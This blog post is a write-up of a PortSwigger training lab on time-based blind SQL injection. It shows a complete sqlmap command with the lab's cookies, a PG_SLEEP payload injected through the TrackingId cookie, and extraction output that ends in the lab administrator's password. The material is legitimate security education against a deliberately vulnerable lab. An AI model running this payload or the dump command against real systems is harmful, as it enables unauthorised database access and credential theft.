---
layout: post
title:  "Blind SQL injection with time delays and information retrieval"
date:   2024-09-25 09:39:54 +0530
---

## Objective 

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

## Solution 

Assume that let's continue with the previous lab where we found a time based SQL injection and now in the sqlmap we can add the following argument `--dump` which will actually dumps the database with the following command 

```sh
sqlmap -u "https://0ab200aa049122c1847d9bdf00600046.web-security-academy.net/filter?category=Pets" --cookie "TrackingId=4HWFjkvkQS0pdMwd; session=E5Vnrbwa0Xd09dJur4uOtXLo7VR2w65i" --dbms="PostgreSQL" --level 2 --threads 5 --dump
```

After sometime, here we found that the `TrackingId` parameter inside cookie is vulnerable to SQL injection 

```sh
[11:29:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:29:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:29:18] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[11:29:19] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[11:29:30] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[11:29:40] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[11:29:50] [INFO] checking if the injection point on Cookie parameter 'TrackingId' is a false positive
Cookie parameter 'TrackingId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 588 HTTP(s) requests:
---
Parameter: TrackingId (Cookie)
    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: TrackingId=4HWFjkvkQS0pdMwd' AND 4567=(SELECT 4567 FROM PG_SLEEP(5))-- AWZm; session=E5Vnrbwa0Xd09dJur4uOtXLo7VR2w65i
```

Finally, After two long hours it worked and got the admin password

```sh
[12:11:49] [INFO] fetching tables for database: 'public'
[12:11:49] [INFO] fetching number of tables for database 'public'
[12:11:49] [INFO] retrieved: 2
[12:12:04] [INFO] retrieving the length of query output
[12:12:04] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                        
8
[12:12:57] [INFO] retrieved: ___c____ 1/8 (12%)
[12:12:57] [ERROR] invalid character detected. retrying..
[12:13:26] [INFO] retrieved: tracking           
[12:13:26] [INFO] retrieving the length of query output
[12:13:26] [INFO] retrieved: 5
[12:14:06] [INFO] retrieved: users           
[12:14:06] [INFO] fetching columns for table 'users' in database 'public'
[12:14:06] [INFO] retrieved: 3
[12:14:26] [INFO] retrieving the length of query output
[12:14:26] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                        
5
[12:15:10] [INFO] retrieved: __a__ 1/5 (20%)
[12:15:20] [ERROR] invalid character detected. retrying..
[12:15:20] [INFO] retrieved: _ma__ 2/5 (40%)
[12:15:20] [ERROR] invalid character detected. retrying..
[12:15:34] [INFO] retrieved: ema_l 4/5 (80%)
[12:15:39] [ERROR] invalid character detected. retrying..
[12:15:53] [INFO] retrieved: email           
[12:15:53] [INFO] retrieving the length of query output
[12:15:53] [INFO] retrieved: 8
[12:16:27] [INFO] retrieved: _a______ 1/8 (12%)
[12:16:37] [ERROR] invalid character detected. retrying..
[12:17:01] [INFO] retrieved: password           
[12:17:01] [INFO] retrieving the length of query output
[12:17:01] [INFO] retrieved: 8
[12:17:45] [INFO] retrieved: _se_____ 2/8 (25%)
[12:17:45] [ERROR] invalid character detected. retrying..
[12:17:48] [INFO] retrieved: _se__a__ 3/8 (37%)
[12:17:50] [ERROR] invalid character detected. retrying..
[12:17:50] [ERROR] invalid character detected. retrying..
[12:17:59] [ERROR] invalid character detected. retrying..
[12:18:17] [INFO] retrieved: username           
[12:18:17] [INFO] fetching entries for table 'users' in database 'public'
[12:18:17] [INFO] fetching number of entries for table 'users' in database 'public'
[12:18:17] [INFO] retrieved: 3
[12:18:37] [INFO] retrieving the length of query output
[12:18:37] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                        

[12:19:00] [INFO] retrieved:  
[12:19:36] [INFO] retrieving the length of query output
[12:19:36] [INFO] retrieved: 20
[12:20:23] [INFO] retrieved: 9___1_______________ 2/20 (10%)
[12:20:24] [ERROR] invalid character detected. retrying..
[12:20:28] [INFO] retrieved: 9d__1_______________ 3/20 (15%)
[12:20:28] [ERROR] invalid character detected. retrying..
[12:21:33] [INFO] retrieved: 9daf1re9zls_r_______ 12/20 (60%)
[12:21:34] [ERROR] invalid character detected. retrying..
[12:22:22] [INFO] retrieved: 9daf1re9zls_rzycg_q_ 17/20 (85%)
[12:22:31] [ERROR] invalid character detected. retrying..
[12:22:45] [INFO] retrieved: 9daf1re9zlsxrzycg6q2             
[12:22:45] [INFO] retrieving the length of query output
[12:22:45] [INFO] retrieved: 1
[12:23:11] [ERROR] invalid character detected. retrying..
3
[12:23:49] [INFO] retrieved: a__i_________ 2/13 (15%)
[12:23:50] [ERROR] invalid character detected. retrying..
[12:24:28] [INFO] retrieved: administra__r 11/13 (84%)
[12:24:28] [ERROR] invalid character detected. retrying..
[12:24:52] [INFO] retrieved: administrator  
```

Now login with those creds which is username is `administrator` and password is `9daf1re9zlsxrzycg6q2` on successful login.. Lab will be solved 

![]({{ site.baseurl }}/assets/images/sqli53.png)